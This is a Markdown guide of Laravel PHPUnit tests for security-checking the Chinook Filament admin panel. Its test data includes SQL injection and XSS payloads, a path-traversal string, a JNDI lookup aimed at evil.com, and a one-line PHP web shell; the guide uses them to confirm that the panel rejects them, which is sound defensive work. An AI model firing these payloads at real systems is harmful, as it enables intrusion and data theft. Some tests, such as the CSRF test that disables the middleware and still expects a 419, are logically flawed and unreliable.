# Security Testing Guide

This guide covers comprehensive security vulnerability and penetration testing for the Chinook Filament admin panel,
including authentication security, authorization testing, input validation, and protection against common web
vulnerabilities.

## Table of Contents

- [Overview](#overview)
- [Authentication Security Testing](#authentication-security-testing)
- [Authorization and Access Control Testing](#authorization-and-access-control-testing)
- [Input Validation and Sanitization Testing](#input-validation-and-sanitization-testing)
- [CSRF Protection Testing](#csrf-protection-testing)
- [SQL Injection Prevention Testing](#sql-injection-prevention-testing)
- [XSS Protection Testing](#xss-protection-testing)
- [Session Security Testing](#session-security-testing)
- [File Upload Security Testing](#file-upload-security-testing)

## Overview

Security testing ensures the Chinook admin panel is protected against common web vulnerabilities and maintains proper
security controls. This includes testing authentication, authorization, input validation, and protection mechanisms.

### Testing Objectives

- **Authentication Security**: Verify secure login and session management
- **Authorization Control**: Test proper access control enforcement
- **Input Validation**: Ensure all inputs are properly validated and sanitized
- **Vulnerability Prevention**: Test protection against OWASP Top 10 vulnerabilities
- **Data Protection**: Verify sensitive data handling and encryption

## Authentication Security Testing

### Password Security Testing

```php
<?php

namespace Tests\Feature\Security;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class AuthenticationSecurityTest extends TestCase
{
    use RefreshDatabase;

    public function test_password_complexity_requirements(): void
    {
        $weakPasswords = [
            '123456',
            'password',
            'qwerty',
            '12345678',
            'abc123',
        ];

        foreach ($weakPasswords as $password) {
            $response = $this->post('/chinook-admin/register', [
                'name' => 'Test User',
                'email' => 'test@example.com',
                'password' => $password,
                'password_confirmation' => $password,
            ]);

            $response->assertSessionHasErrors(['password']);
        }
    }

    public function test_password_hashing_security(): void
    {
        $user = User::factory()->create([
            'password' => Hash::make('secure_password_123'),
        ]);

        // Password should be hashed
        $this->assertNotEquals('secure_password_123', $user->password);
        
        // Should use bcrypt or argon2
        $this->assertTrue(
            str_starts_with($user->password, '$2y$') || 
            str_starts_with($user->password, '$argon2')
        );

        // Verify password can be checked
        $this->assertTrue(Hash::check('secure_password_123', $user->password));
    }

    public function test_brute_force_protection(): void
    {
        $user = User::factory()->create([
            'email' => 'test@example.com',
            'password' => Hash::make('correct_password'),
        ]);

        // Attempt multiple failed logins
        for ($i = 0; $i < 6; $i++) {
            $this->post('/chinook-admin/login', [
                'email' => 'test@example.com',
                'password' => 'wrong_password',
            ]);
        }

        // Next attempt should be rate limited
        $response = $this->post('/chinook-admin/login', [
            'email' => 'test@example.com',
            'password' => 'wrong_password',
        ]);

        $response->assertStatus(429); // Too Many Requests
    }

    public function test_account_lockout_mechanism(): void
    {
        $user = User::factory()->create([
            'email' => 'test@example.com',
            'password' => Hash::make('correct_password'),
        ]);

        // Simulate multiple failed attempts
        for ($i = 0; $i < 10; $i++) {
            $this->post('/chinook-admin/login', [
                'email' => 'test@example.com',
                'password' => 'wrong_password',
            ]);
        }

        // Even correct password should be blocked temporarily
        $response = $this->post('/chinook-admin/login', [
            'email' => 'test@example.com',
            'password' => 'correct_password',
        ]);

        $response->assertStatus(429);
    }

    public function test_password_reset_security(): void
    {
        $user = User::factory()->create(['email' => 'test@example.com']);

        // Request password reset
        $response = $this->post('/chinook-admin/forgot-password', [
            'email' => 'test@example.com',
        ]);

        $response->assertRedirect();

        // Verify token is created and has expiration
        $this->assertDatabaseHas('password_reset_tokens', [
            'email' => 'test@example.com',
        ]);

        $token = \DB::table('password_reset_tokens')
            ->where('email', 'test@example.com')
            ->first();

        $this->assertNotNull($token->created_at);
        
        // Token should be hashed
        $this->assertGreaterThan(32, strlen($token->token));
    }
}
```

### Session Security Testing

```php
public function test_session_fixation_protection(): void
{
    $user = User::factory()->create([
        'email' => 'test@example.com',
        'password' => Hash::make('password123'),
    ]);
    $user->assignRole('Admin');

    // Get initial session ID
    $response = $this->get('/chinook-admin/login');
    $initialSessionId = session()->getId();

    // Login should regenerate session ID
    $response = $this->post('/chinook-admin/login', [
        'email' => 'test@example.com',
        'password' => 'password123',
    ]);

    $newSessionId = session()->getId();
    $this->assertNotEquals($initialSessionId, $newSessionId);
}

public function test_session_timeout_security(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $this->actingAs($user);

    // Simulate expired session
    session(['last_activity' => now()->subMinutes(121)->timestamp]);

    $response = $this->get('/chinook-admin/artists');

    $response->assertRedirect('/chinook-admin/login');
    $this->assertGuest();
}

public function test_concurrent_session_handling(): void
{
    $user = User::factory()->create([
        'email' => 'test@example.com',
        'password' => Hash::make('password123'),
    ]);
    $user->assignRole('Admin');

    // First login
    $response1 = $this->post('/chinook-admin/login', [
        'email' => 'test@example.com',
        'password' => 'password123',
    ]);

    $firstSessionId = session()->getId();

    // Second login (different session)
    $response2 = $this->withSession([])
        ->post('/chinook-admin/login', [
            'email' => 'test@example.com',
            'password' => 'password123',
        ]);

    $secondSessionId = session()->getId();

    // Sessions should be different
    $this->assertNotEquals($firstSessionId, $secondSessionId);

    // Both sessions should be valid (or implement single session policy)
    $this->actingAs($user)
        ->get('/chinook-admin')
        ->assertStatus(200);
}
```

## Authorization and Access Control Testing

### Role-Based Access Control Testing

```php
public function test_unauthorized_access_prevention(): void
{
    $user = User::factory()->create();
    // No role assigned

    $protectedRoutes = [
        '/chinook-admin',
        '/chinook-admin/artists',
        '/chinook-admin/albums',
        '/chinook-admin/tracks',
        '/chinook-admin/customers',
        '/chinook-admin/employees',
    ];

    foreach ($protectedRoutes as $route) {
        $response = $this->actingAs($user)->get($route);
        $response->assertStatus(403);
    }
}

public function test_privilege_escalation_prevention(): void
{
    $guestUser = User::factory()->create();
    $guestUser->assignRole('Guest');

    $adminUser = User::factory()->create();
    $adminUser->assignRole('Admin');

    // Guest should not be able to access admin functions
    $response = $this->actingAs($guestUser)
        ->post('/chinook-admin/users', [
            'name' => 'Malicious User',
            'email' => 'malicious@test.com',
            'password' => 'password123',
        ]);

    $response->assertStatus(403);

    // Guest should not be able to modify admin user
    $response = $this->actingAs($guestUser)
        ->put("/chinook-admin/users/{$adminUser->id}", [
            'name' => 'Modified Admin',
        ]);

    $response->assertStatus(403);
}

public function test_horizontal_privilege_escalation_prevention(): void
{
    $user1 = User::factory()->create();
    $user1->assignRole('Editor');

    $user2 = User::factory()->create();
    $user2->assignRole('Editor');

    $artist1 = Artist::factory()->create(['created_by' => $user1->id]);
    $artist2 = Artist::factory()->create(['created_by' => $user2->id]);

    // User1 should not be able to modify User2's content
    $response = $this->actingAs($user1)
        ->put("/chinook-admin/artists/{$artist2->id}", [
            'name' => 'Modified by User1',
        ]);

    $response->assertStatus(403);
}

public function test_direct_object_reference_protection(): void
{
    $user = User::factory()->create();
    $user->assignRole('Editor');

    $publicArtist = Artist::factory()->create(['is_active' => true]);
    $privateArtist = Artist::factory()->create(['is_active' => false]);

    // Should not be able to access private artist by ID manipulation
    $response = $this->actingAs($user)
        ->get("/chinook-admin/artists/{$privateArtist->id}");

    $response->assertStatus(403);
}
```

## Input Validation and Sanitization Testing

### Input Validation Testing

```php
public function test_input_length_validation(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // Test extremely long input
    $longString = str_repeat('a', 10000);

    $response = $this->actingAs($user)
        ->post('/chinook-admin/artists', [
            'name' => $longString,
            'country' => 'US',
        ]);

    $response->assertSessionHasErrors(['name']);
}

public function test_special_character_handling(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $specialCharacters = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE artists; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
    ];

    foreach ($specialCharacters as $maliciousInput) {
        $response = $this->actingAs($user)
            ->post('/chinook-admin/artists', [
                'name' => $maliciousInput,
                'country' => 'US',
            ]);

        // Should either reject or sanitize the input
        if ($response->isRedirect()) {
            $artist = Artist::where('name', $maliciousInput)->first();
            $this->assertNull($artist, "Malicious input was stored: {$maliciousInput}");
        }
    }
}

public function test_file_type_validation(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // Test malicious file types
    $maliciousFiles = [
        'test.php',
        'test.exe',
        'test.bat',
        'test.sh',
        'test.jsp',
    ];

    foreach ($maliciousFiles as $filename) {
        $file = \Illuminate\Http\UploadedFile::fake()->create($filename, 100);

        $response = $this->actingAs($user)
            ->post('/chinook-admin/artists', [
                'name' => 'Test Artist',
                'country' => 'US',
                'profile_image' => $file,
            ]);

        $response->assertSessionHasErrors(['profile_image']);
    }
}

public function test_numeric_input_validation(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $invalidNumericInputs = [
        'abc',
        '1.5.3',
        '999999999999999999999',
        '-999999',
        'NaN',
        'Infinity',
    ];

    foreach ($invalidNumericInputs as $input) {
        $response = $this->actingAs($user)
            ->post('/chinook-admin/artists', [
                'name' => 'Test Artist',
                'country' => 'US',
                'formed_year' => $input,
            ]);

        $response->assertSessionHasErrors(['formed_year']);
    }
}
```

## CSRF Protection Testing

### CSRF Token Testing

```php
public function test_csrf_protection_on_forms(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // Attempt to submit form without CSRF token
    $response = $this->actingAs($user)
        ->withoutMiddleware(\App\Http\Middleware\VerifyCsrfToken::class)
        ->post('/chinook-admin/artists', [
            'name' => 'CSRF Test Artist',
            'country' => 'US',
        ]);

    $response->assertStatus(419); // CSRF token mismatch
}

public function test_csrf_token_regeneration(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // Get initial CSRF token
    $response = $this->actingAs($user)
        ->get('/chinook-admin/artists/create');

    $content = $response->getContent();
    preg_match('/name="_token" value="([^"]+)"/', $content, $matches);
    $initialToken = $matches[1] ?? null;

    $this->assertNotNull($initialToken);

    // Make a request that should regenerate token
    $this->actingAs($user)
        ->post('/chinook-admin/artists', [
            '_token' => $initialToken,
            'name' => 'Test Artist',
            'country' => 'US',
        ]);

    // Get new token
    $response = $this->actingAs($user)
        ->get('/chinook-admin/artists/create');

    $content = $response->getContent();
    preg_match('/name="_token" value="([^"]+)"/', $content, $matches);
    $newToken = $matches[1] ?? null;

    // Token should be different
    $this->assertNotEquals($initialToken, $newToken);
}

public function test_csrf_token_in_ajax_requests(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // AJAX request without CSRF token should fail
    $response = $this->actingAs($user)
        ->postJson('/api/v1/artists', [
            'name' => 'AJAX Test Artist',
            'country' => 'US',
        ]);

    $response->assertStatus(401); // Unauthorized due to missing token
}
```

## SQL Injection Prevention Testing

### SQL Injection Testing

```php
public function test_sql_injection_prevention_in_search(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    Artist::factory()->create(['name' => 'Legitimate Artist']);

    $sqlInjectionPayloads = [
        "'; DROP TABLE artists; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO artists (name) VALUES ('hacked'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
    ];

    foreach ($sqlInjectionPayloads as $payload) {
        $response = $this->actingAs($user)
            ->get('/chinook-admin/artists?search=' . urlencode($payload));

        $response->assertStatus(200);
        
        // Verify no SQL injection occurred
        $this->assertDatabaseHas('artists', ['name' => 'Legitimate Artist']);
        $this->assertDatabaseMissing('artists', ['name' => 'hacked']);
    }
}

public function test_parameterized_queries_usage(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // Test that raw queries are not vulnerable
    $maliciousId = "1; DROP TABLE artists; --";

    try {
        $artist = Artist::find($maliciousId);
        $this->assertNull($artist);
    } catch (\Exception $e) {
        // Exception is acceptable for invalid input
        $this->assertTrue(true);
    }

    // Verify table still exists
    $this->assertDatabaseHas('artists', []);
}

public function test_orm_injection_prevention(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    Artist::factory()->create(['name' => 'Test Artist']);

    // Test ORM with malicious input
    $maliciousInput = "'; DROP TABLE artists; --";

    $artists = Artist::where('name', 'LIKE', "%{$maliciousInput}%")->get();

    $this->assertInstanceOf(\Illuminate\Database\Eloquent\Collection::class, $artists);
    $this->assertDatabaseHas('artists', ['name' => 'Test Artist']);
}
```

## XSS Protection Testing

### Cross-Site Scripting Prevention

```php
public function test_xss_prevention_in_output(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    ];

    foreach ($xssPayloads as $payload) {
        $artist = Artist::factory()->create(['name' => $payload]);

        $response = $this->actingAs($user)
            ->get('/chinook-admin/artists');

        $content = $response->getContent();

        // Verify XSS payload is escaped
        $this->assertStringNotContainsString('<script>', $content);
        $this->assertStringNotContainsString('javascript:', $content);
        $this->assertStringNotContainsString('onerror=', $content);
        $this->assertStringNotContainsString('onload=', $content);
    }
}

public function test_content_security_policy_headers(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $response = $this->actingAs($user)
        ->get('/chinook-admin/artists');

    // Check for CSP headers
    $this->assertTrue(
        $response->headers->has('Content-Security-Policy') ||
        $response->headers->has('X-Content-Security-Policy')
    );
}

public function test_xss_prevention_in_rich_text(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $maliciousContent = '<p>Safe content</p><script>alert("XSS")</script>';

    $response = $this->actingAs($user)
        ->post('/chinook-admin/artists', [
            'name' => 'Test Artist',
            'country' => 'US',
            'biography' => $maliciousContent,
        ]);

    if ($response->isRedirect()) {
        $artist = Artist::where('name', 'Test Artist')->first();
        
        // Script tags should be removed
        $this->assertStringNotContainsString('<script>', $artist->biography);
        $this->assertStringContainsString('<p>Safe content</p>', $artist->biography);
    }
}
```

## Session Security Testing

### Session Management Security

```php
public function test_session_cookie_security(): void
{
    $user = User::factory()->create([
        'email' => 'test@example.com',
        'password' => Hash::make('password123'),
    ]);
    $user->assignRole('Admin');

    $response = $this->post('/chinook-admin/login', [
        'email' => 'test@example.com',
        'password' => 'password123',
    ]);

    // Check session cookie attributes
    $cookies = $response->headers->getCookies();
    $sessionCookie = collect($cookies)->first(function ($cookie) {
        return str_contains($cookie->getName(), 'session');
    });

    if ($sessionCookie) {
        $this->assertTrue($sessionCookie->isHttpOnly());
        $this->assertTrue($sessionCookie->isSecure() || app()->environment('testing'));
        $this->assertEquals('lax', strtolower($sessionCookie->getSameSite()));
    }
}

public function test_session_data_encryption(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $this->actingAs($user);

    // Store sensitive data in session
    session(['sensitive_data' => 'secret_information']);

    // Verify session data is encrypted
    $sessionId = session()->getId();
    $sessionData = \Storage::disk('local')->get("framework/sessions/{$sessionId}");

    $this->assertStringNotContainsString('secret_information', $sessionData);
}

public function test_session_invalidation_on_logout(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $this->actingAs($user);
    $sessionId = session()->getId();

    // Logout
    $this->post('/chinook-admin/logout');

    // Try to use old session
    $response = $this->withSession(['_token' => $sessionId])
        ->get('/chinook-admin');

    $response->assertRedirect('/chinook-admin/login');
}
```

## File Upload Security Testing

### File Upload Validation

```php
public function test_file_upload_size_limits(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // Create oversized file
    $largeFile = \Illuminate\Http\UploadedFile::fake()
        ->image('large.jpg')
        ->size(10000); // 10MB

    $response = $this->actingAs($user)
        ->post('/chinook-admin/artists', [
            'name' => 'Test Artist',
            'country' => 'US',
            'profile_image' => $largeFile,
        ]);

    $response->assertSessionHasErrors(['profile_image']);
}

public function test_file_content_validation(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    // Create file with malicious content but valid extension
    $maliciousFile = \Illuminate\Http\UploadedFile::fake()
        ->createWithContent('malicious.jpg', '<?php system($_GET["cmd"]); ?>');

    $response = $this->actingAs($user)
        ->post('/chinook-admin/artists', [
            'name' => 'Test Artist',
            'country' => 'US',
            'profile_image' => $maliciousFile,
        ]);

    $response->assertSessionHasErrors(['profile_image']);
}

public function test_file_storage_security(): void
{
    $user = User::factory()->create();
    $user->assignRole('Admin');

    $file = \Illuminate\Http\UploadedFile::fake()->image('test.jpg');

    $response = $this->actingAs($user)
        ->post('/chinook-admin/artists', [
            'name' => 'Test Artist',
            'country' => 'US',
            'profile_image' => $file,
        ]);

    if ($response->isRedirect()) {
        $artist = Artist::where('name', 'Test Artist')->first();
        
        if ($artist && $artist->hasMedia('profile_images')) {
            $media = $artist->getFirstMedia('profile_images');
            
            // File should be stored outside web root or with proper access controls
            $this->assertStringNotContainsString('public/', $media->getPath());
        }
    }
}
```

## Related Documentation

- **[Authentication Testing](090-auth-testing.md)** - Authentication mechanisms testing
- **[RBAC Testing](100-rbac-testing.md)** - Role-based access control testing
- **[API Testing](110-api-testing.md)** - API security testing
- **[Performance Testing](130-performance-testing.md)** - Security performance testing

---

## Navigation

**← Previous:** [Accessibility Testing](150-accessibility-testing.md)

**Next →** [Testing Documentation Index](000-testing-index.md)

**Up:** [Testing Documentation Index](000-testing-index.md)
